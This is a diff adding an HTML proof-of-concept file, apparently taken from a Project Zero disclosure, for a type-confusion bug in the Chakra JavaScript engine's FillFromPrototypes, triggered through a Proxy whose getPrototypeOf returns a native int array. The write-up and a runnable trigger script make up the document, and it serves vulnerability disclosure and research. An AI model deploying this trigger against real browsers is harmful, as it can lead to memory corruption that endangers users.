@@ -1,0 +1,48 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=945
+
+JavascriptArray::FillFromPrototypes is a method that is used by several Javascript functions available in the browser to set the native elements of an array to the values provide by its prototype. This function calls JavascriptArray::ForEachOwnMissingArrayIndexOfObject with the prototype of the object as a parameter, and if the prototype of the object is an array, it assumes that it is a Var array. While arrays are generally converted to var arrays if they are set as an object's prototype, if an object's prototype is a Proxy object, it can return a parent prototype that is a native int array. This can lead to type confusing, allowing an integer to be treated as an absolute pointer, when JavascriptArray::FillFromPrototypes is called. A minimal PoC is as follows, and a full PoC is attached.
+
+var a = new Array(0x11111111, 0x22222222, 0x33333333, 0x44444444, 0x12121212, 0x23232323, 0x12345670, 0x7777);
+
+var handler = {
+    getPrototypeOf: function(target, name){
+	return a;
+    }
+};
+
+var p = new Proxy([], handler);
+var b = [{}, [], "natalie"];
+
+b.__proto__ = p;
+b.length = 4;
+
+a.shift.call(b);
+ // b[2] is type confused
+-->
+
+<html>
+<body>
+<script>
+
+var a = new Array(0x11111111, 0x22222222, 0x33333333, 0x44444444, 0x12121212, 0x23232323, 0x12345670, 0x7777);
+
+var handler = {
+    getPrototypeOf: function(target, name){
+       // print("get proto");
+	return a;
+    }
+};
+
+var p = new Proxy([], handler);
+var b = [{}, [], "natalie"];
+
+b.__proto__ = p;
+b.length = 4;
+
+a.shift.call(b);
+print(a.shift.call(b[2]));
+
+</script>
+</body>
+</html>
